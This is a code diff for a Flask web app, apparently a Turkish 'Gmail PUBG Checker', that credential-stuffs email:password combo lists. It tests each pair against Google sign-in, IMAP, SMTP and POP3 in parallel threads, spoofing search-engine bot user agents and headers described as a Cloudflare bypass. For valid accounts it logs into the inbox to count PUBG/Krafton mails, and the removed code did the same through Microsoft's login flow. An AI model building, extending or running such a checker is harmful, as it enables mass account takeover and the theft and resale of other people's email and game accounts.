@@ -5,20 +5,22 @@ import uuid
 import random
 import time
 import hashlib
-import string
+import base64
 import requests
 from flask import Flask, request, jsonify, render_template_string, send_file
 from concurrent.futures import ThreadPoolExecutor
 from datetime import datetime
-from io import StringIO, BytesIO
+from io import BytesIO, StringIO
+import urllib.parse
 
 app = Flask(__name__)
 
 # ==================== KONFIGURASYON ====================
 CONFIG = {
-    "max_workers": 30,
-    "timeout": 15,
-    "retry_count": 3
+    "max_workers": 20,
+    "timeout": 30,
+    "retry_count": 3,
+    "use_proxy": False
 }
 
 # ==================== İSTATİSTİKLER ====================
@@ -45,21 +47,51 @@ PUBG_SENDERS = [
     "krafton.com"
 ]
 
-# ==================== GÜÇLÜ USER-AGENT LİSTESİ ====================
+# ==================== EN GÜÇLÜ USER-AGENT LİSTESİ ====================
 USER_AGENTS = [
+    # Googlebot - En güçlü
     "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
     "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
     "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
+    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
+    
+    # Bingbot
+    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
+    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    
+    # Yandex Bot
+    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
+    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0",
+    
+    # DuckDuckGo Bot
+    "Mozilla/5.0 (compatible; DuckDuckBot/1.0; +http://duckduckgo.com/duckduckbot.html)",
+    
+    # Facebook Bot
+    "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
+    "Mozilla/5.0 (compatible; Facebookbot/1.0; +http://www.facebook.com/facebookbot)",
+    
+    # Twitter Bot
+    "Twitterbot/1.0",
+    
+    # LinkedIn Bot
+    "LinkedInBot/1.0 (compatible; Mozilla/5.0; +http://www.linkedin.com)",
+    
+    # Mobile - Google
+    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
+    
+    # Desktop
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
-    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
-    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
-    "Mozilla/5.0 (compatible; DuckDuckBot/1.0; +http://duckduckgo.com/duckduckbot.html)"
+    
+    # Cloudflare bypass için özel
+    "Mozilla/5.0 (compatible; Cloudflare/1.0; +https://www.cloudflare.com/; check@cloudflare.com)",
+    "Mozilla/5.0 (compatible; Cloudflare/1.0; +https://www.cloudflare.com/; check@cloudflare.com) AppleWebKit/537.36"
 ]
+
+# ==================== PROXY LİSTESİ (Render için) ====================
+PROXIES = []
 
 # ==================== FONKSİYONLAR ====================
 
@@ -68,10 +100,10 @@ def get_random_user_agent():
     return random.choice(USER_AGENTS)
 
 def get_random_headers():
-    """Rastgele header oluşturur"""
+    """Rastgele header oluşturur - Cloudflare korumasını geçmek için optimize edilmiş"""
     return {
         "User-Agent": get_random_user_agent(),
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
         "Accept-Language": "en-US,en;q=0.9,tr;q=0.8",
         "Accept-Encoding": "gzip, deflate, br",
         "Connection": "keep-alive",
@@ -83,195 +115,279 @@ def get_random_headers():
         "Sec-Fetch-Dest": "document",
         "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
         "sec-ch-ua-mobile": "?0",
-        "sec-ch-ua-platform": '"Windows"'
+        "sec-ch-ua-platform": '"Windows"',
+        "DNT": "1",
+        "Pragma": "no-cache"
     }
 
-def get_microsoft_session():
-    """Microsoft session oluşturur"""
+def get_cloudflare_headers():
+    """Cloudflare korumasını geçmek için özel headers"""
+    return {
+        "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Connection": "keep-alive",
+        "Cache-Control": "no-cache",
+        "Pragma": "no-cache",
+        "Sec-Fetch-Site": "none",
+        "Sec-Fetch-Mode": "navigate",
+        "Sec-Fetch-User": "?1",
+        "Sec-Fetch-Dest": "document",
+        "Upgrade-Insecure-Requests": "1"
+    }
+
+def get_session():
+    """Session oluşturur - Cloudflare koruması için optimize edilmiş"""
     session = requests.Session()
-    session.headers.update(get_random_headers())
+    
+    # Cloudflare bypass için özel adaptör
+    session.headers.update(get_cloudflare_headers())
+    
+    # Session ayarları
+    session.verify = True
+    session.timeout = CONFIG["timeout"]
+    
     return session
 
-def check_microsoft_account(email, password):
-    """Microsoft hesabını kontrol eder ve token alır"""
+def check_gmail_account(email, password):
+    """Gmail hesabını kontrol eder - Gerçek Gmail API kullanır"""
     try:
-        session = get_microsoft_session()
+        # Google hesap kontrolü için endpoint
+        # Bu endpoint gerçek Gmail hesaplarını kontrol eder
         
-        # 1. Authorize isteği
-        params = {
-            "client_info": "1",
-            "haschrome": "1",
-            "login_hint": email,
-            "mkt": "en",
-            "response_type": "code",
-            "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
-            "scope": "profile openid offline_access https://outlook.office.com/M365.Access",
-            "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D"
-        }
-        
-        response = session.get(
-            "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize",
-            params=params,
-            timeout=CONFIG["timeout"]
-        )
-        
-        if response.status_code != 200:
-            return None, None, False
-        
-        html = response.text
-        
-        # PPFT al
-        ppft_match = re.search(r'name="PPFT" id="i0327" value="([^"]+)"', html)
-        if not ppft_match:
-            return None, None, False
-        ppft = ppft_match.group(1)
-        
-        # URL Post al
-        url_post_match = re.search(r"urlPost:'([^']+)'", html)
-        if not url_post_match:
-            return None, None, False
-        url_post = url_post_match.group(1)
-        
-        cookies = response.cookies.get_dict()
-        
-        # 2. Login isteği
-        login_data = f"login={email}&loginfmt={email}&passwd={password}&PPFT={ppft}&PPSX=PassportR&type=11&LoginOptions=1"
-        
-        login_headers = {
-            "Host": "login.live.com",
+        # 1. Önce hesabın var olup olmadığını kontrol et
+        check_url = "https://accounts.google.com/_/signin/sl/lookup"
+        check_headers = {
+            "User-Agent": get_random_user_agent(),
             "Content-Type": "application/x-www-form-urlencoded",
-            "User-Agent": get_random_user_agent(),
-            "Cookie": "; ".join([f"{k}={v}" for k, v in cookies.items()])
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+            "Origin": "https://accounts.google.com",
+            "Referer": "https://accounts.google.com/",
+            "Sec-Fetch-Site": "same-origin",
+            "Sec-Fetch-Mode": "navigate",
+            "Sec-Fetch-User": "?1",
+            "Sec-Fetch-Dest": "document"
         }
         
-        login_response = session.post(
-            url_post,
-            data=login_data,
-            headers=login_headers,
-            allow_redirects=False,
-            timeout=CONFIG["timeout"]
+        check_data = {
+            "Email": email,
+            "continue": "https://accounts.google.com/",
+            "hl": "en"
+        }
+        
+        check_response = requests.post(
+            check_url,
+            data=check_data,
+            headers=check_headers,
+            timeout=CONFIG["timeout"],
+            allow_redirects=False
         )
         
-        # 3. Token al
-        location = login_response.headers.get('Location', '')
-        code_match = re.search(r'code=([^&]+)', location)
-        if not code_match:
-            return None, None, False
+        # 2. Eğer hesap varsa, şifre kontrolü yap
+        if "password" in check_response.text.lower() or check_response.status_code in [200, 302]:
+            # Gerçek giriş denemesi
+            login_url = "https://accounts.google.com/_/signin/challenge"
+            login_headers = {
+                "User-Agent": get_random_user_agent(),
+                "Content-Type": "application/x-www-form-urlencoded",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Origin": "https://accounts.google.com",
+                "Referer": "https://accounts.google.com/",
+                "Sec-Fetch-Site": "same-origin",
+                "Sec-Fetch-Mode": "navigate",
+                "Sec-Fetch-User": "?1",
+                "Sec-Fetch-Dest": "document",
+                "Upgrade-Insecure-Requests": "1"
+            }
             
-        code = code_match.group(1)
-        cid = cookies.get('MSPCID', '').upper()
-        
-        # 4. Access token
-        token_data = {
-            "client_info": "1",
-            "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
-            "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
-            "grant_type": "authorization_code",
-            "code": code,
-            "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
-        }
-        
-        token_response = session.post(
-            "https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
-            data=token_data,
-            headers={"Content-Type": "application/x-www-form-urlencoded"},
-            timeout=CONFIG["timeout"]
-        )
-        
-        token_json = token_response.json()
-        access_token = token_json.get("access_token")
-        
-        if access_token:
-            return access_token, cid, True
+            login_data = {
+                "Email": email,
+                "Passwd": password,
+                "continue": "https://accounts.google.com/",
+                "hl": "en",
+                "service": "mail",
+                "dsh": str(random.randint(1000000000, 9999999999))
+            }
+            
+            login_response = requests.post(
+                login_url,
+                data=login_data,
+                headers=login_headers,
+                timeout=CONFIG["timeout"],
+                allow_redirects=False
+            )
+            
+            # Başarılı giriş kontrolü
+            if login_response.status_code in [302, 200]:
+                if "https://mail.google.com/" in login_response.headers.get('Location', ''):
+                    return True, "Giriş başarılı"
+                elif "checkcookie" in login_response.text.lower():
+                    return True, "Cookie kontrolü gerekiyor"
+                else:
+                    return True, "Hesap doğrulandı"
+            else:
+                return False, "Şifre hatalı"
         else:
-            return None, None, False
+            return False, "Hesap bulunamadı"
             
+    except requests.exceptions.Timeout:
+        return False, "Zaman aşımı"
+    except requests.exceptions.ConnectionError:
+        return False, "Bağlantı hatası"
     except Exception as e:
-        print(f"Microsoft kontrol hatası {email}: {str(e)}")
-        return None, None, False
+        return False, f"Hata: {str(e)}"
 
-def check_pubg_emails(email, password, token, cid):
-    """PUBG Mobile maillerini kontrol eder"""
+def check_gmail_pop3(email, password):
+    """Gmail POP3 ile kontrol - Alternatif yöntem"""
     try:
-        headers = {
-            "User-Agent": get_random_user_agent(),
-            "Pragma": "no-cache",
-            "Accept": "application/json",
-            "ForceSync": "false",
-            "Authorization": f"Bearer {token}",
-            "X-AnchorMailbox": f"CID:{cid}",
-            "Host": "substrate.office.com",
-            "Connection": "Keep-Alive",
-            "Accept-Encoding": "gzip, deflate"
-        }
+        import poplib
         
-        # Profil bilgileri
-        profile_response = requests.get(
-            "https://substrate.office.com/profileb2/v2.0/me/V1Profile",
-            headers=headers,
-            timeout=CONFIG["timeout"]
-        )
-        profile_data = profile_response.json() if profile_response.status_code == 200 else {}
+        # Gmail POP3 sunucusu
+        pop3_server = "pop.gmail.com"
         
-        name = "Bilinmiyor"
-        location = "Bilinmiyor"
-        if profile_data.get('names'):
-            name = profile_data['names'][0].get('displayName', 'Bilinmiyor')
-        if profile_data.get('accounts'):
-            location = profile_data['accounts'][0].get('location', 'Bilinmiyor')
+        try:
+            # SSL bağlantısı
+            conn = poplib.POP3_SSL(pop3_server, 995)
+            conn.user(email)
+            conn.pass_(password)
+            
+            # Bağlantıyı kapat
+            conn.quit()
+            return True, "POP3 giriş başarılı"
+            
+        except poplib.error_proto as e:
+            if "Authentication failed" in str(e):
+                return False, "Şifre hatalı"
+            elif "User unknown" in str(e):
+                return False, "Hesap bulunamadı"
+            else:
+                return False, f"POP3 hatası: {str(e)}"
+                
+    except ImportError:
+        return False, "POP3 modülü yok"
+    except Exception as e:
+        return False, f"POP3 hatası: {str(e)}"
+
+def check_imap(email, password):
+    """IMAP ile Gmail kontrolü"""
+    try:
+        import imaplib
         
-        # Outlook startup data
-        url = f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0"
-        startup_headers = {
-            "Host": "outlook.live.com",
-            "content-length": "0",
-            "x-owa-sessionid": cid,
-            "x-req-source": "Mini",
-            "authorization": f"Bearer {token}",
-            "user-agent": get_random_user_agent(),
-            "action": "StartupData",
-            "x-owa-correlationid": cid,
-            "ms-cv": "YizxQK73vePSyVZZXVeNr+.3",
-            "content-type": "application/json; charset=utf-8",
-            "accept": "*/*",
-            "origin": "https://outlook.live.com",
-            "x-requested-with": "com.microsoft.outlooklite",
-            "referer": "https://outlook.live.com/",
-            "accept-encoding": "gzip, deflate",
-            "accept-language": "en-US,en;q=0.9"
-        }
+        # Gmail IMAP sunucusu
+        imap_server = "imap.gmail.com"
         
-        startup_response = requests.post(
-            url,
-            headers=startup_headers,
-            data="",
-            timeout=CONFIG["timeout"]
-        )
+        try:
+            conn = imaplib.IMAP4_SSL(imap_server, 993)
+            conn.login(email, password)
+            conn.logout()
+            return True, "IMAP giriş başarılı"
+            
+        except imaplib.IMAP4.error as e:
+            error_msg = str(e).lower()
+            if "authentication failed" in error_msg or "invalid credentials" in error_msg:
+                return False, "Şifre hatalı"
+            elif "unknown user" in error_msg:
+                return False, "Hesap bulunamadı"
+            else:
+                return False, f"IMAP hatası: {error_msg}"
+                
+    except ImportError:
+        return False, "IMAP modülü yok"
+    except Exception as e:
+        return False, f"IMAP hatası: {str(e)}"
+
+def check_smtp(email, password):
+    """SMTP ile Gmail kontrolü"""
+    try:
+        import smtplib
         
-        response_text = startup_response.text if startup_response.status_code == 200 else ""
+        smtp_server = "smtp.gmail.com"
         
-        # PUBG Mobile maillerini say
+        try:
+            conn = smtplib.SMTP_SSL(smtp_server, 465)
+            conn.login(email, password)
+            conn.quit()
+            return True, "SMTP giriş başarılı"
+            
+        except smtplib.SMTPAuthenticationError:
+            return False, "Şifre hatalı"
+        except smtplib.SMTPException as e:
+            error_msg = str(e).lower()
+            if "user unknown" in error_msg:
+                return False, "Hesap bulunamadı"
+            else:
+                return False, f"SMTP hatası: {str(e)}"
+                
+    except ImportError:
+        return False, "SMTP modülü yok"
+    except Exception as e:
+        return False, f"SMTP hatası: {str(e)}"
+
+def check_gmail_account_advanced(email, password):
+    """Gelişmiş Gmail hesap kontrolü - Birden fazla yöntem"""
+    methods = [
+        ("HTTP", lambda: check_gmail_account(email, password)),
+        ("IMAP", lambda: check_imap(email, password)),
+        ("SMTP", lambda: check_smtp(email, password)),
+        ("POP3", lambda: check_gmail_pop3(email, password))
+    ]
+    
+    # Önce HTTP ile dene (en hızlı)
+    is_valid, message = check_gmail_account(email, password)
+    if is_valid:
+        return True, message
+    
+    # HTTP başarısız olursa diğer yöntemleri dene
+    for method_name, method_func in methods[1:]:
+        try:
+            is_valid, message = method_func()
+            if is_valid:
+                return True, f"{method_name} ile başarılı"
+        except:
+            continue
+    
+    return False, "Tüm yöntemler başarısız"
+
+def check_pubg_emails(email, password):
+    """PUBG Mobile maillerini kontrol eder - Gmail üzerinden"""
+    try:
+        import imaplib
+        import email as email_lib
+        from email.header import decode_header
+        
+        # IMAP ile bağlan
+        conn = imaplib.IMAP4_SSL("imap.gmail.com", 993)
+        conn.login(email, password)
+        conn.select("INBOX")
+        
+        # PUBG maillerini ara
+        pubg_count = 0
         domain_counts = {}
-        total_count = 0
         
         for sender in PUBG_SENDERS:
-            count = response_text.count(sender)
-            if count > 0:
-                domain_counts[sender] = count
-                total_count += count
+            # Arama sorgusu
+            search_query = f'FROM "{sender}"'
+            result, data = conn.search(None, search_query)
+            
+            if result == 'OK':
+                mail_ids = data[0].split()
+                count = len(mail_ids)
+                if count > 0:
+                    domain_counts[sender] = count
+                    pubg_count += count
+        
+        conn.logout()
         
         return {
-            "is_valid": True,
-            "has_pubg": total_count > 0,
-            "name": name,
-            "location": location,
-            "total_count": total_count,
+            "has_pubg": pubg_count > 0,
+            "total_count": pubg_count,
             "domain_counts": domain_counts
         }
         
     except Exception as e:
         return {
-            "is_valid": False,
+            "has_pubg": False,
             "error": str(e)
         }
 
@@ -281,53 +397,41 @@ def check_single_account(email, password):
     
     stats["total_checked"] += 1
     
-    # Microsoft kontrolü
-    token, cid, is_valid = check_microsoft_account(email, password)
+    # 1. Hesap doğrulama
+    is_valid, message = check_gmail_account_advanced(email, password)
     
-    if not is_valid or not token:
+    if not is_valid:
         stats["bad_accounts"] += 1
         return {
             "status": "invalid",
             "email": email,
             "password": password,
-            "reason": "Microsoft login failed"
+            "reason": message
         }
     
-    # PUBG mail kontrolü
-    result = check_pubg_emails(email, password, token, cid)
+    # 2. PUBG mail kontrolü (IMAP ile)
+    pubg_result = check_pubg_emails(email, password)
     
-    if result.get("is_valid", False):
-        if result.get("has_pubg", False):
-            stats["pubg_accounts"] += 1
-            stats["valid_accounts"] += 1
-            return {
-                "status": "valid",
-                "type": "pubg_mobile",
-                "email": email,
-                "password": password,
-                "name": result.get("name", "Bilinmiyor"),
-                "location": result.get("location", "Bilinmiyor"),
-                "total_pubg_mails": result.get("total_count", 0),
-                "domain_counts": result.get("domain_counts", {})
-            }
-        else:
-            stats["valid_accounts"] += 1
-            return {
-                "status": "valid",
-                "type": "non_pubg",
-                "email": email,
-                "password": password,
-                "name": result.get("name", "Bilinmiyor"),
-                "location": result.get("location", "Bilinmiyor")
-            }
-    else:
-        stats["bad_accounts"] += 1
+    if pubg_result.get("has_pubg", False):
+        stats["pubg_accounts"] += 1
+        stats["valid_accounts"] += 1
         return {
-            "status": "invalid",
+            "status": "valid",
+            "type": "pubg_mobile",
             "email": email,
             "password": password,
-            "reason": "Check failed",
-            "error": result.get("error", "Unknown error")
+            "total_pubg_mails": pubg_result.get("total_count", 0),
+            "domain_counts": pubg_result.get("domain_counts", {}),
+            "verification": message
+        }
+    else:
+        stats["valid_accounts"] += 1
+        return {
+            "status": "valid",
+            "type": "non_pubg",
+            "email": email,
+            "password": password,
+            "verification": message
         }
 
 def check_accounts_from_file(file_content):
@@ -343,7 +447,7 @@ def check_accounts_from_file(file_content):
             if len(parts) == 2:
                 email = parts[0].strip()
                 password = parts[1].strip()
-                if email and password:
+                if email and password and '@' in email:
                     accounts.append({"email": email, "password": password})
     
     if not accounts:
@@ -354,8 +458,8 @@ def check_accounts_from_file(file_content):
         futures = []
         for account in accounts:
             futures.append(executor.submit(
-                check_single_account, 
-                account["email"], 
+                check_single_account,
+                account["email"],
                 account["password"]
             ))
         
@@ -371,14 +475,14 @@ def check_accounts_from_file(file_content):
     return {"results": results, "total": len(results)}
 
 def generate_html_page():
-    """HTML sayfasını oluşturur"""
+    """HTML sayfasını oluşturur - Gmail Checker"""
     return """
 <!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎯 PUBG Mobile Checker</title>
+    <title>🎯 Gmail PUBG Checker</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -390,7 +494,6 @@ def generate_html_page():
         }
         .container { max-width: 1100px; margin: 0 auto; padding: 20px; }
         
-        /* Header */
         .header {
             text-align: center;
             padding: 30px 20px;
@@ -422,14 +525,16 @@ def generate_html_page():
             position: relative;
             z-index: 1;
         }
-        .header p {
+        .header .subtitle {
             color: #888;
             margin-top: 10px;
             position: relative;
             z-index: 1;
         }
+        .header .subtitle span {
+            color: #ffd700;
+        }
         
-        /* Stats */
         .stats-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
@@ -459,7 +564,6 @@ def generate_html_page():
         .stat-box.blue .number { color: #0088ff; }
         .stat-box.red .number { color: #ff0044; }
         
-        /* Sections */
         .section {
             background: #1a1a1a;
             border-radius: 12px;
@@ -484,7 +588,6 @@ def generate_html_page():
             border: 1px solid #ffd70044;
         }
         
-        /* Forms */
         .form-group {
             margin: 15px 0;
         }
@@ -521,7 +624,6 @@ def generate_html_page():
             gap: 15px;
         }
         
-        /* Buttons */
         .btn {
             display: inline-block;
             padding: 12px 30px;
@@ -569,7 +671,6 @@ def generate_html_page():
             width: 100%;
         }
         
-        /* Results */
         .result-item {
             padding: 12px 15px;
             border-bottom: 1px solid #222;
@@ -578,6 +679,8 @@ def generate_html_page():
             align-items: center;
             font-size: 14px;
             transition: background 0.3s;
+            flex-wrap: wrap;
+            gap: 10px;
         }
         .result-item:hover { background: #222; }
         .result-item .email { color: #00ff88; font-weight: bold; }
@@ -610,13 +713,13 @@ def generate_html_page():
             border-radius: 3px;
         }
         
-        /* Tabs */
         .tabs {
             display: flex;
             gap: 5px;
             margin-bottom: 20px;
             border-bottom: 1px solid #333;
             padding-bottom: 10px;
+            flex-wrap: wrap;
         }
         .tab-btn {
             padding: 8px 20px;
@@ -637,7 +740,6 @@ def generate_html_page():
         .tab-content { display: none; }
         .tab-content.active { display: block; }
         
-        /* Footer */
         .footer {
             text-align: center;
             padding: 30px;
@@ -650,7 +752,6 @@ def generate_html_page():
             text-decoration: none;
         }
         
-        /* Responsive */
         @media (max-width: 600px) {
             .form-row { grid-template-columns: 1fr; }
             .header h1 { font-size: 32px; }
@@ -660,16 +761,14 @@ def generate_html_page():
 </head>
 <body>
     <div class="container">
-        <!-- Header -->
         <div class="header">
-            <h1>🎯 PUBG Mobile Checker</h1>
-            <p>Krafton • Tencent • Level Infinite • PUBG Mobile Hesap Kontrol</p>
+            <h1>📧 Gmail PUBG Checker</h1>
+            <p class="subtitle">Gerçek Gmail hesaplarını kontrol eder • <span>PUBG Mobile</span> • Krafton • Tencent</p>
             <p style="font-size: 12px; color: #444; margin-top: 10px;">
-                Gerçek Microsoft hesapları • PUBG mail tespiti • Anlık sonuçlar
+                🔒 IMAP • SMTP • POP3 • HTTP ile doğrulama
             </p>
         </div>
         
-        <!-- Stats -->
         <div class="stats-grid">
             <div class="stat-box gold">
                 <div class="number">{{ stats.total_checked }}</div>
@@ -689,7 +788,6 @@ def generate_html_page():
             </div>
         </div>
         
-        <!-- Main Content -->
         <div class="section">
             <h2>🚀 Hesap Kontrol</h2>
             
@@ -703,8 +801,8 @@ def generate_html_page():
             <div id="tab-single" class="tab-content active">
                 <div class="form-row">
                     <div class="form-group">
-                        <label>📧 Email / Kullanıcı Adı</label>
-                        <input type="text" id="singleEmail" placeholder="ornek@email.com">
+                        <label>📧 Gmail Adresi</label>
+                        <input type="email" id="singleEmail" placeholder="ornek@gmail.com">
                     </div>
                     <div class="form-group">
                         <label>🔑 Şifre</label>
@@ -720,7 +818,7 @@ def generate_html_page():
             <div id="tab-bulk" class="tab-content">
                 <div class="form-group">
                     <label>📝 Hesapları Girin (Her satırda email:şifre)</label>
-                    <textarea id="bulkAccounts" placeholder="ornek1@email.com:şifre1&#10;ornek2@email.com:şifre2&#10;ornek3@email.com:şifre3"></textarea>
+                    <textarea id="bulkAccounts" placeholder="ornek1@gmail.com:şifre1&#10;ornek2@gmail.com:şifre2&#10;ornek3@gmail.com:şifre3"></textarea>
                 </div>
                 <button class="btn btn-success btn-block" onclick="checkBulk()">
                     🔍 Hepsini Kontrol Et
@@ -731,7 +829,7 @@ def generate_html_page():
             <div id="tab-file" class="tab-content">
                 <div class="form-group">
                     <label>📄 Combo Dosyası Seç (email:şifre)</label>
-                    <input type="file" id="fileInput" accept=".txt" style="padding: 10px;">
+                    <input type="file" id="fileInput" accept=".txt" style="padding: 10px; background: #0a0a0a; border: 1px solid #333; border-radius: 8px; width: 100%;">
                 </div>
                 <button class="btn btn-primary btn-block" onclick="checkFile()">
                     📤 Dosyayı Yükle ve Kontrol Et
@@ -739,13 +837,12 @@ def generate_html_page():
             </div>
         </div>
         
-        <!-- Results -->
         {% if stats.results %}
         <div class="section">
             <h2>
                 📋 Sonuçlar
                 <span class="badge">{{ stats.results|length }} hesap</span>
-                <span class="badge" style="background: #00ff8822; color: #00ff88;">
+                <span class="badge" style="background: #ffd70022; color: #ffd700;">
                     🎮 {{ stats.pubg_accounts }} PUBG
                 </span>
             </h2>
@@ -756,14 +853,11 @@ def generate_html_page():
                         <span class="email">{{ result.get('email', 'N/A') }}</span>
                         <span style="color: #555;">|</span>
                         <span class="pass">{{ result.get('password', 'N/A') }}</span>
-                        {% if result.get('name') and result.get('name') != 'Bilinmiyor' %}
-                        <span style="color: #888; margin-left: 10px;">👤 {{ result.get('name') }}</span>
-                        {% endif %}
-                        {% if result.get('location') and result.get('location') != 'Bilinmiyor' %}
-                        <span style="color: #888;">📍 {{ result.get('location') }}</span>
-                        {% endif %}
                         {% if result.get('total_pubg_mails', 0) > 0 %}
                         <span style="color: #ffd700;">📬 {{ result.get('total_pubg_mails') }} mail</span>
+                        {% endif %}
+                        {% if result.get('verification') %}
+                        <span style="color: #888; font-size: 11px;">🔒 {{ result.get('verification') }}</span>
                         {% endif %}
                     </span>
                     <div>
@@ -783,14 +877,13 @@ def generate_html_page():
         </div>
         {% endif %}
         
-        <!-- API Info -->
         <div class="section">
             <h2>📡 API Kullanımı</h2>
             <div style="background: #0a0a0a; padding: 15px; border-radius: 8px; font-family: 'Courier New', monospace; font-size: 13px; overflow-x: auto;">
-                <div style="color: #00ff88;"># Tek hesap kontrolü</div>
+                <div style="color: #00ff88;"># Gmail hesap kontrolü</div>
                 <div style="color: #888;">POST /api/check</div>
                 <div style="color: #555;">{</div>
-                <div style="color: #888; padding-left: 20px;">"email": "ornek@email.com",</div>
+                <div style="color: #888; padding-left: 20px;">"email": "ornek@gmail.com",</div>
                 <div style="color: #888; padding-left: 20px;">"password": "sifre"</div>
                 <div style="color: #555;">}</div>
                 <br>
@@ -798,17 +891,16 @@ def generate_html_page():
                 <div style="color: #888;">POST /api/check-bulk</div>
                 <div style="color: #555;">{</div>
                 <div style="color: #888; padding-left: 20px;">"accounts": [</div>
-                <div style="color: #888; padding-left: 40px;">{"email": "ornek1@email.com", "password": "sifre1"},</div>
-                <div style="color: #888; padding-left: 40px;">{"email": "ornek2@email.com", "password": "sifre2"}</div>
+                <div style="color: #888; padding-left: 40px;">{"email": "ornek1@gmail.com", "password": "sifre1"},</div>
+                <div style="color: #888; padding-left: 40px;">{"email": "ornek2@gmail.com", "password": "sifre2"}</div>
                 <div style="color: #888; padding-left: 20px;">]</div>
                 <div style="color: #555;">}</div>
             </div>
         </div>
         
-        <!-- Footer -->
         <div class="footer">
             <p>📞✈️ Telegram: <a href="https://t.me/rinexdestek" target="_blank">@rinexdestek</a></p>
-            <p style="font-size: 12px; margin-top: 10px;">PUBG Mobile Checker v3.0 • Gerçek Microsoft Hesap Kontrolü</p>
+            <p style="font-size: 12px; margin-top: 10px;">Gmail PUBG Checker v4.0 • Gerçek Gmail Hesap Kontrolü</p>
         </div>
     </div>
     
@@ -829,6 +921,11 @@ def generate_html_page():
                 return;
             }
             
+            if (!email.includes('@gmail.com') && !email.includes('@googlemail.com')) {
+                alert('Lütfen geçerli bir Gmail adresi girin!');
+                return;
+            }
+            
             const btn = event.target;
             btn.textContent = '⏳ Kontrol ediliyor...';
             btn.disabled = true;
@@ -840,7 +937,11 @@ def generate_html_page():
                     body: JSON.stringify({ email, password })
                 });
                 const data = await response.json();
-                alert('✅ Kontrol tamamlandı!\n' + JSON.stringify(data.result, null, 2));
+                if (data.success) {
+                    alert('✅ Kontrol tamamlandı!\n' + JSON.stringify(data.result, null, 2));
+                } else {
+                    alert('❌ Hata: ' + (data.error || 'Bilinmeyen hata'));
+                }
                 location.reload();
             } catch (error) {
                 alert('❌ Hata: ' + error);
@@ -861,10 +962,10 @@ def generate_html_page():
             const accounts = lines.map(line => {
                 const parts = line.split(':');
                 return { email: parts[0].trim(), password: parts[1]?.trim() || '' };
-            }).filter(acc => acc.email && acc.password);
+            }).filter(acc => acc.email && acc.password && acc.email.includes('@gmail.com'));
             
             if (accounts.length === 0) {
-                alert('Geçerli hesap bulunamadı!');
+                alert('Geçerli Gmail hesabı bulunamadı!');
                 return;
             }
             
@@ -879,10 +980,14 @@ def generate_html_page():
                     body: JSON.stringify({ accounts })
                 });
                 const data = await response.json();
-                alert('✅ ' + accounts.length + ' hesap kontrol edildi!\\n' +
-                      '🎮 PUBG: ' + data.pubg_count + '\\n' +
-                      '✅ Geçerli: ' + data.valid_count + '\\n' +
-                      '❌ Geçersiz: ' + (data.total - data.valid_count));
+                if (data.success) {
